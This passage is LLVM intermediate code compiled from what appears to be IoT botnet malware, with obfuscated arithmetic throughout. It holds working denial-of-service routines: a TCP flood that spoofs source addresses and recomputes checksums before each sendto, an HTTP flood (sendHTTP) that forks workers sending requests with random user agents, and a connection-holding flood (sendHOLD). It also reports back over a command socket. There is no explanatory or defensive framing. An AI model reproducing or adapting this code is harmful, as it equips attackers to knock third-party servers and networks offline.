  %418 = load i16, i16* %417, align 4
  %419 = xor i16 -2049, -1
  %420 = xor i16 %418, %419
  %421 = and i16 %420, %418
  %422 = and i16 %418, -2049
  %423 = xor i16 %421, -1
  %424 = xor i16 2048, -1
  %425 = xor i16 4468, -1
  %426 = and i16 %423, 4468
  %427 = and i16 %421, %425
  %428 = and i16 %424, 4468
  %429 = and i16 2048, %425
  %430 = or i16 %426, %427
  %431 = or i16 %428, %429
  %432 = xor i16 %430, %431
  %433 = or i16 %423, %424
  %434 = xor i16 %433, -1
  %435 = or i16 4468, %425
  %436 = and i16 %434, %435
  %437 = or i16 %432, %436
  %438 = or i16 %421, 2048
  store i16 %437, i16* %417, align 4
  br label %443

; <label>:439:                                    ; preds = %409
  %440 = load i32, i32* @mainCommSock, align 4
  %441 = load i8*, i8** %23, align 8
  %442 = call i32 (i32, i8*, ...) @sockprintf(i32 %440, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.412, i32 0, i32 0), i8* %441)
  br label %443

; <label>:443:                                    ; preds = %439, %413
  br label %444

; <label>:444:                                    ; preds = %443, %379
  br label %445

; <label>:445:                                    ; preds = %444, %349
  br label %446

; <label>:446:                                    ; preds = %445, %327
  br label %447

; <label>:447:                                    ; preds = %446, %297
  %448 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %448, i8** %23, align 8
  br label %290

; <label>:449:                                    ; preds = %290
  br label %450

; <label>:450:                                    ; preds = %449, %161
  %451 = call i32 @rand_cmwc()
  %452 = trunc i32 %451 to i16
  %453 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %454 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %453, i32 0, i32 0
  %455 = bitcast %union.anon.1* %454 to %struct.anon.2*
  %456 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %455, i32 0, i32 5
  store i16 %452, i16* %456, align 2
  %457 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %458 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %457, i32 0, i32 0
  %459 = bitcast %union.anon.1* %458 to %struct.anon.2*
  %460 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %459, i32 0, i32 6
  store i16 0, i16* %460, align 4
  %461 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %462 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %461, i32 0, i32 0
  %463 = bitcast %union.anon.1* %462 to %struct.anon.2*
  %464 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %463, i32 0, i32 7
  store i16 0, i16* %464, align 2
  %465 = load i32, i32* %9, align 4
  %466 = icmp eq i32 %465, 0
  br i1 %466, label %467, label %469

; <label>:467:                                    ; preds = %450
  %468 = call i32 @rand_cmwc()
  br label %474

; <label>:469:                                    ; preds = %450
  %470 = load i32, i32* %9, align 4
  %471 = trunc i32 %470 to i16
  %472 = call zeroext i16 @htons(i16 zeroext %471) #13
  %473 = zext i16 %472 to i32
  br label %474

; <label>:474:                                    ; preds = %469, %467
  %475 = phi i32 [ %468, %467 ], [ %473, %469 ]
  %476 = trunc i32 %475 to i16
  %477 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %478 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %477, i32 0, i32 0
  %479 = bitcast %union.anon.1* %478 to %struct.anon.2*
  %480 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %479, i32 0, i32 1
  store i16 %476, i16* %480, align 2
  %481 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %482 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %483 = call zeroext i16 @tcpcsum(%struct.iphdr* %481, %struct.tcphdr* %482)
  %484 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %485 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %484, i32 0, i32 0
  %486 = bitcast %union.anon.1* %485 to %struct.anon.2*
  %487 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %486, i32 0, i32 6
  store i16 %483, i16* %487, align 4
  %488 = bitcast i8* %98 to i16*
  %489 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %490 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %489, i32 0, i32 2
  %491 = load i16, i16* %490, align 2
  %492 = zext i16 %491 to i32
  %493 = call zeroext i16 @csum(i16* %488, i32 %492)
  %494 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %495 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %494, i32 0, i32 7
  store i16 %493, i16* %495, align 2
  %496 = call i64 @time(i64* null) #2
  %497 = load i32, i32* %10, align 4
  %498 = sext i32 %497 to i64
  %499 = sub i64 0, %498
  %500 = sub i64 %496, %499
  %501 = add nsw i64 %496, %498
  %502 = trunc i64 %500 to i32
  store i32 %502, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %503

; <label>:503:                                    ; preds = %560, %559, %474
  br label %504

; <label>:504:                                    ; preds = %503
  %505 = load i32, i32* %17, align 4
  %506 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %507 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %507, %struct.sockaddr** %506, align 8
  %508 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %509 = load %struct.sockaddr*, %struct.sockaddr** %508, align 8
  %510 = call i64 @sendto(i32 %505, i8* %98, i64 %95, i32 0, %struct.sockaddr* %509, i32 16)
  %511 = load i32, i32* %19, align 4
  %512 = call i32 (i32, ...) bitcast (i32 ()* @getDatIP to i32 (i32, ...)*)(i32 %511)
  %513 = call i32 @htonl(i32 %512) #13
  %514 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %515 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %514, i32 0, i32 8
  store i32 %513, i32* %515, align 4
  %516 = call i32 @rand_cmwc()
  %517 = trunc i32 %516 to i16
  %518 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %519 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %518, i32 0, i32 3
  store i16 %517, i16* %519, align 4
  %520 = call i32 @rand_cmwc()
  %521 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %522 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %521, i32 0, i32 0
  %523 = bitcast %union.anon.1* %522 to %struct.anon.2*
  %524 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %523, i32 0, i32 2
  store i32 %520, i32* %524, align 4
  %525 = call i32 @rand_cmwc()
  %526 = trunc i32 %525 to i16
  %527 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %528 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %527, i32 0, i32 0
  %529 = bitcast %union.anon.1* %528 to %struct.anon.2*
  %530 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %529, i32 0, i32 0
  store i16 %526, i16* %530, align 4
  %531 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %532 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %531, i32 0, i32 0
  %533 = bitcast %union.anon.1* %532 to %struct.anon.2*
  %534 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %533, i32 0, i32 6
  store i16 0, i16* %534, align 4
  %535 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %536 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %537 = call zeroext i16 @tcpcsum(%struct.iphdr* %535, %struct.tcphdr* %536)
  %538 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %539 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %538, i32 0, i32 0
  %540 = bitcast %union.anon.1* %539 to %struct.anon.2*
  %541 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %540, i32 0, i32 6
  store i16 %537, i16* %541, align 4
  %542 = bitcast i8* %98 to i16*
  %543 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %544 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %543, i32 0, i32 2
  %545 = load i16, i16* %544, align 2
  %546 = zext i16 %545 to i32
  %547 = call zeroext i16 @csum(i16* %542, i32 %546)
  %548 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %549 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %548, i32 0, i32 7
  store i16 %547, i16* %549, align 2
  %550 = load i32, i32* %25, align 4
  %551 = load i32, i32* %15, align 4
  %552 = icmp eq i32 %550, %551
  br i1 %552, label %553, label %560

; <label>:553:                                    ; preds = %504
  %554 = call i64 @time(i64* null) #2
  %555 = load i32, i32* %24, align 4
  %556 = sext i32 %555 to i64
  %557 = icmp sgt i64 %554, %556
  br i1 %557, label %558, label %559

; <label>:558:                                    ; preds = %553
  br label %566

; <label>:559:                                    ; preds = %553
  store i32 0, i32* %25, align 4
  br label %503

; <label>:560:                                    ; preds = %504
  %561 = load i32, i32* %25, align 4
  %562 = sub i32 %561, -2026144267
  %563 = add i32 %562, 1
  %564 = add i32 %563, -2026144267
  %565 = add i32 %561, 1
  store i32 %564, i32* %25, align 4
  br label %503

; <label>:566:                                    ; preds = %558
  %567 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %567)
  br label %568

; <label>:568:                                    ; preds = %566, %60, %52, %45
  ret void
}

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [3 x i8*], align 16
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [512 x i8], align 16
  %17 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %18 = bitcast [3 x i8*]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %18, i8* bitcast ([3 x i8*]* @sendHTTP.connections to i8*), i64 24, i32 16, i1 false)
  %19 = call i64 @time(i64* null) #2
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = sub i64 0, %21
  %23 = sub i64 %19, %22
  %24 = add nsw i64 %19, %21
  %25 = trunc i64 %23 to i32
  store i32 %25, i32* %15, align 4
  %26 = getelementptr inbounds [512 x i8], [512 x i8]* %16, i32 0, i32 0
  %27 = load i8*, i8** %7, align 8
  %28 = load i8*, i8** %10, align 8
  %29 = call i32 @rand() #2
  %30 = srem i32 %29, 3
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds [3 x i8*], [3 x i8*]* %13, i64 0, i64 %31
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @rand() #2
  %35 = sext i32 %34 to i64
  %36 = urem i64 %35, 36
  %37 = getelementptr inbounds [36 x i8*], [36 x i8*]* @UserAgents, i64 0, i64 %36
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 (i8*, i8*, ...) @sprintf(i8* %26, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.416, i32 0, i32 0), i8* %27, i8* %28, i8* %33, i8* %38) #2
  store i32 0, i32* %14, align 4
  br label %40

; <label>:40:                                     ; preds = %70, %6
  %41 = load i32, i32* %14, align 4
  %42 = load i32, i32* %12, align 4
  %43 = icmp slt i32 %41, %42
  br i1 %43, label %44, label %76

; <label>:44:                                     ; preds = %40
  %45 = call i32 @fork() #2
  %46 = icmp ne i32 %45, 0
  br i1 %46, label %47, label %69

; <label>:47:                                     ; preds = %44
  br label %48

; <label>:48:                                     ; preds = %67, %47
  %49 = load i32, i32* %15, align 4
  %50 = sext i32 %49 to i64
  %51 = call i64 @time(i64* null) #2
  %52 = icmp sgt i64 %50, %51
  br i1 %52, label %53, label %68

; <label>:53:                                     ; preds = %48
  %54 = load i8*, i8** %8, align 8
  %55 = load i16, i16* %9, align 2
  %56 = call i32 @socket_connect(i8* %54, i16 zeroext %55)
  store i32 %56, i32* %17, align 4
  %57 = load i32, i32* %17, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %59, label %67

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %17, align 4
  %61 = getelementptr inbounds [512 x i8], [512 x i8]* %16, i32 0, i32 0
  %62 = getelementptr inbounds [512 x i8], [512 x i8]* %16, i32 0, i32 0
  %63 = call i64 @strlen(i8* %62) #10
  %64 = call i64 @write(i32 %60, i8* %61, i64 %63)
  %65 = load i32, i32* %17, align 4
  %66 = call i32 @close(i32 %65)
  br label %67

; <label>:67:                                     ; preds = %59, %53
  br label %48

; <label>:68:                                     ; preds = %48
  call void @exit(i32 1) #14
  unreachable

; <label>:69:                                     ; preds = %44
  br label %70

; <label>:70:                                     ; preds = %69
  %71 = load i32, i32* %14, align 4
  %72 = add i32 %71, -1975241114
  %73 = add i32 %72, 1
  %74 = sub i32 %73, -1975241114
  %75 = add nsw i32 %71, 1
  store i32 %74, i32* %14, align 4
  br label %40

; <label>:76:                                     ; preds = %40
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %3
  br label %307

; <label>:34:                                     ; preds = %3
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %36 = getelementptr inbounds [8 x i8], [8 x i8]* %35, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 8, i32 4, i1 false)
  %37 = load i32, i32* %7, align 4
  %38 = zext i32 %37 to i64
  %39 = call i8* @llvm.stacksave()
  store i8* %39, i8** %10, align 8
  %40 = alloca %struct.state_t, i64 %38, align 16
  %41 = bitcast %struct.state_t* %40 to i8*
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = mul i64 %43, 5
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 %44, i32 16, i1 false)
  %45 = call i64 @time(i64* null) #2
  %46 = load i32, i32* %6, align 4
  %47 = sext i32 %46 to i64
  %48 = add i64 %45, -1533153060426231199
  %49 = add i64 %48, %47
  %50 = sub i64 %49, -1533153060426231199
  %51 = add nsw i64 %45, %47
  %52 = trunc i64 %50 to i32
  store i32 %52, i32* %16, align 4
  br label %53

; <label>:53:                                     ; preds = %304, %34
  %54 = load i32, i32* %16, align 4
  %55 = sext i32 %54 to i64
  %56 = call i64 @time(i64* null) #2
  %57 = icmp sgt i64 %55, %56
  br i1 %57, label %58, label %305

; <label>:58:                                     ; preds = %53
  store i32 0, i32* %8, align 4
  br label %59

; <label>:59:                                     ; preds = %298, %58
  %60 = load i32, i32* %8, align 4
  %61 = load i32, i32* %7, align 4
  %62 = icmp slt i32 %60, %61
  br i1 %62, label %63, label %304

; <label>:63:                                     ; preds = %59
  %64 = load i32, i32* %8, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %65
  %67 = getelementptr inbounds %struct.state_t, %struct.state_t* %66, i32 0, i32 1
  %68 = load i8, i8* %67, align 4
  %69 = zext i8 %68 to i32
  switch i32 %69, label %297 [
    i32 0, label %70
    i32 1, label %132
    i32 2, label %236
  ]

; <label>:70:                                     ; preds = %63
  %71 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %72 = load i32, i32* %8, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %73
  %75 = getelementptr inbounds %struct.state_t, %struct.state_t* %74, i32 0, i32 0
  store i32 %71, i32* %75, align 8
  %76 = load i32, i32* %8, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %77
  %79 = getelementptr inbounds %struct.state_t, %struct.state_t* %78, i32 0, i32 0
  %80 = load i32, i32* %79, align 8
  %81 = load i32, i32* %8, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %82
  %84 = getelementptr inbounds %struct.state_t, %struct.state_t* %83, i32 0, i32 0
  %85 = load i32, i32* %84, align 8
  %86 = call i32 (i32, i32, ...) @fcntl(i32 %85, i32 3, i8* null)
  %87 = xor i32 %86, -1
  %88 = xor i32 2048, -1
  %89 = xor i32 -706742618, -1
  %90 = and i32 %87, -706742618
  %91 = and i32 %86, %89
  %92 = and i32 %88, -706742618
  %93 = and i32 2048, %89
  %94 = or i32 %90, %91
  %95 = or i32 %92, %93
  %96 = xor i32 %94, %95
  %97 = or i32 %87, %88
  %98 = xor i32 %97, -1
  %99 = or i32 -706742618, %89
  %100 = and i32 %98, %99
  %101 = or i32 %96, %100
  %102 = or i32 %86, 2048
  %103 = call i32 (i32, i32, ...) @fcntl(i32 %80, i32 4, i32 %101)
  %104 = load i32, i32* %8, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %105
  %107 = getelementptr inbounds %struct.state_t, %struct.state_t* %106, i32 0, i32 0
  %108 = load i32, i32* %107, align 8
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @connect(i32 %108, %struct.sockaddr* %112, i32 16)
  %114 = icmp ne i32 %113, -1
  br i1 %114, label %119, label %115

; <label>:115:                                    ; preds = %70
  %116 = call i32* @__errno_location() #13
  %117 = load i32, i32* %116, align 4
  %118 = icmp ne i32 %117, 115
  br i1 %118, label %119, label %126

; <label>:119:                                    ; preds = %115, %70
  %120 = load i32, i32* %8, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %121
  %123 = getelementptr inbounds %struct.state_t, %struct.state_t* %122, i32 0, i32 0
  %124 = load i32, i32* %123, align 8
  %125 = call i32 @close(i32 %124)
  br label %131

; <label>:126:                                    ; preds = %115
  %127 = load i32, i32* %8, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %128
  %130 = getelementptr inbounds %struct.state_t, %struct.state_t* %129, i32 0, i32 1
  store i8 1, i8* %130, align 4
  br label %131

; <label>:131:                                    ; preds = %126, %119
  br label %297

; <label>:132:                                    ; preds = %63
  br label %133

; <label>:133:                                    ; preds = %132
  %134 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %135 = getelementptr inbounds [16 x i64], [16 x i64]* %134, i64 0, i64 0
  %136 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %135) #2, !srcloc !7
  %137 = extractvalue { i64, i64* } %136, 0
  %138 = extractvalue { i64, i64* } %136, 1
  %139 = trunc i64 %137 to i32
  store i32 %139, i32* %18, align 4
  %140 = ptrtoint i64* %138 to i64
  %141 = trunc i64 %140 to i32
  store i32 %141, i32* %19, align 4
  br label %142

; <label>:142:                                    ; preds = %133
  br label %143

; <label>:143:                                    ; preds = %142
  %144 = load i32, i32* %8, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %145
  %147 = getelementptr inbounds %struct.state_t, %struct.state_t* %146, i32 0, i32 0
  %148 = load i32, i32* %147, align 8
  %149 = srem i32 %148, 64
  %150 = zext i32 %149 to i64
  %151 = shl i64 1, %150
  %152 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %153 = load i32, i32* %8, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %154
  %156 = getelementptr inbounds %struct.state_t, %struct.state_t* %155, i32 0, i32 0
  %157 = load i32, i32* %156, align 8
  %158 = sdiv i32 %157, 64
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds [16 x i64], [16 x i64]* %152, i64 0, i64 %159
  %161 = load i64, i64* %160, align 8
  %162 = xor i64 %161, -1
  %163 = xor i64 %151, -1
  %164 = xor i64 -7862810336859581434, -1
  %165 = and i64 %162, -7862810336859581434
  %166 = and i64 %161, %164
  %167 = and i64 %163, -7862810336859581434
  %168 = and i64 %151, %164
  %169 = or i64 %165, %166
  %170 = or i64 %167, %168
  %171 = xor i64 %169, %170
  %172 = or i64 %162, %163
  %173 = xor i64 %172, -1
  %174 = or i64 -7862810336859581434, %164
  %175 = and i64 %173, %174
  %176 = or i64 %171, %175
  %177 = or i64 %161, %151
  store i64 %176, i64* %160, align 8
  %178 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %178, align 8
  %179 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %179, align 8
  %180 = load i32, i32* %8, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %181
  %183 = getelementptr inbounds %struct.state_t, %struct.state_t* %182, i32 0, i32 0
  %184 = load i32, i32* %183, align 8
  %185 = sub i32 0, %184
  %186 = sub i32 0, 1
  %187 = add i32 %185, %186
  %188 = sub i32 0, %187
  %189 = add nsw i32 %184, 1
  %190 = call i32 @select(i32 %188, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %190, i32* %15, align 4
  %191 = load i32, i32* %15, align 4
  %192 = icmp eq i32 %191, 1
  br i1 %192, label %193, label %220

; <label>:193:                                    ; preds = %143
  store i32 4, i32* %13, align 4
  %194 = load i32, i32* %8, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %195
  %197 = getelementptr inbounds %struct.state_t, %struct.state_t* %196, i32 0, i32 0
  %198 = load i32, i32* %197, align 8
  %199 = bitcast i32* %14 to i8*
  %200 = call i32 @getsockopt(i32 %198, i32 1, i32 4, i8* %199, i32* %13) #2
  %201 = load i32, i32* %14, align 4
  %202 = icmp ne i32 %201, 0
  br i1 %202, label %203, label %214

; <label>:203:                                    ; preds = %193
  %204 = load i32, i32* %8, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %205
  %207 = getelementptr inbounds %struct.state_t, %struct.state_t* %206, i32 0, i32 0
  %208 = load i32, i32* %207, align 8
  %209 = call i32 @close(i32 %208)
  %210 = load i32, i32* %8, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %211
  %213 = getelementptr inbounds %struct.state_t, %struct.state_t* %212, i32 0, i32 1
  store i8 0, i8* %213, align 4
  br label %219

; <label>:214:                                    ; preds = %193
  %215 = load i32, i32* %8, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %216
  %218 = getelementptr inbounds %struct.state_t, %struct.state_t* %217, i32 0, i32 1
  store i8 2, i8* %218, align 4
  br label %219

; <label>:219:                                    ; preds = %214, %203
  br label %235

; <label>:220:                                    ; preds = %143
  %221 = load i32, i32* %15, align 4
  %222 = icmp eq i32 %221, -1
  br i1 %222, label %223, label %234

; <label>:223:                                    ; preds = %220
  %224 = load i32, i32* %8, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %225
  %227 = getelementptr inbounds %struct.state_t, %struct.state_t* %226, i32 0, i32 0
  %228 = load i32, i32* %227, align 8
  %229 = call i32 @close(i32 %228)
  %230 = load i32, i32* %8, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %231
  %233 = getelementptr inbounds %struct.state_t, %struct.state_t* %232, i32 0, i32 1
  store i8 0, i8* %233, align 4
  br label %234

; <label>:234:                                    ; preds = %223, %220
  br label %235

; <label>:235:                                    ; preds = %234, %219
  br label %297

; <label>:236:                                    ; preds = %63
  br label %237

; <label>:237:                                    ; preds = %236
  %238 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %239 = getelementptr inbounds [16 x i64], [16 x i64]* %238, i64 0, i64 0
  %240 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %239) #2, !srcloc !8
  %241 = extractvalue { i64, i64* } %240, 0
  %242 = extractvalue { i64, i64* } %240, 1
  %243 = trunc i64 %241 to i32
  store i32 %243, i32* %20, align 4
  %244 = ptrtoint i64* %242 to i64
  %245 = trunc i64 %244 to i32
  store i32 %245, i32* %21, align 4
  br label %246

; <label>:246:                                    ; preds = %237
  br label %247

; <label>:247:                                    ; preds = %246
  %248 = load i32, i32* %8, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %249
  %251 = getelementptr inbounds %struct.state_t, %struct.state_t* %250, i32 0, i32 0
  %252 = load i32, i32* %251, align 8
  %253 = srem i32 %252, 64
  %254 = zext i32 %253 to i64
  %255 = shl i64 1, %254
  %256 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %257 = load i32, i32* %8, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %258
  %260 = getelementptr inbounds %struct.state_t, %struct.state_t* %259, i32 0, i32 0
  %261 = load i32, i32* %260, align 8
  %262 = sdiv i32 %261, 64
  %263 = sext i32 %262 to i64
  %264 = getelementptr inbounds [16 x i64], [16 x i64]* %256, i64 0, i64 %263
  %265 = load i64, i64* %264, align 8
  %266 = and i64 %265, %255
  %267 = xor i64 %265, %255
  %268 = or i64 %266, %267
  %269 = or i64 %265, %255
  store i64 %268, i64* %264, align 8
  %270 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %270, align 8
  %271 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %271, align 8
  %272 = load i32, i32* %8, align 4
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %273
  %275 = getelementptr inbounds %struct.state_t, %struct.state_t* %274, i32 0, i32 0
  %276 = load i32, i32* %275, align 8
  %277 = sub i32 0, %276
  %278 = sub i32 0, 1
  %279 = add i32 %277, %278
  %280 = sub i32 0, %279
  %281 = add nsw i32 %276, 1
  %282 = call i32 @select(i32 %280, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %282, i32* %15, align 4
  %283 = load i32, i32* %15, align 4
  %284 = icmp ne i32 %283, 0
  br i1 %284, label %285, label %296

; <label>:285:                                    ; preds = %247
  %286 = load i32, i32* %8, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %287
  %289 = getelementptr inbounds %struct.state_t, %struct.state_t* %288, i32 0, i32 0
  %290 = load i32, i32* %289, align 8
  %291 = call i32 @close(i32 %290)
  %292 = load i32, i32* %8, align 4
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %293
  %295 = getelementptr inbounds %struct.state_t, %struct.state_t* %294, i32 0, i32 1
  store i8 0, i8* %295, align 4
  br label %296

; <label>:296:                                    ; preds = %285, %247
  br label %297

; <label>:297:                                    ; preds = %296, %235, %131, %63
  br label %298

